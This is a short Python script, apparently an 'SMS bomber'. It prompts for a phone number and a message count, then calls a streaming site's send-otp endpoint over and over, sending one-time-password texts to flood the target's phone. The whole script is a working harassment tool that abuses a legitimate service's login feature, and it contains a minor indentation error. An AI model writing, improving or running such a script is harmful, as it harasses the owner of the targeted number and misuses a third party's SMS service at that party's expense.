import os
import time
from urllib import request
import colorama
    
colorama.init()

phone = input(colorama.Fore.RED+'[+ enter the phone number ]: ')
    
sms = int(input(colorama.Fore.RED+'[+ enter sms quantity ]: '))
    
print(colorama.Fore.GREEN+'sms sending...\pleas wait...')
    
url = "https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"
    
for a in range(sms):
    request.urlopen(url)
    v = colorama.Fore.YELLOW+str(a+1)+ "sms send "
     print(v) 
    time.sleep(30)
        
print('All sms is sended!')    
        
        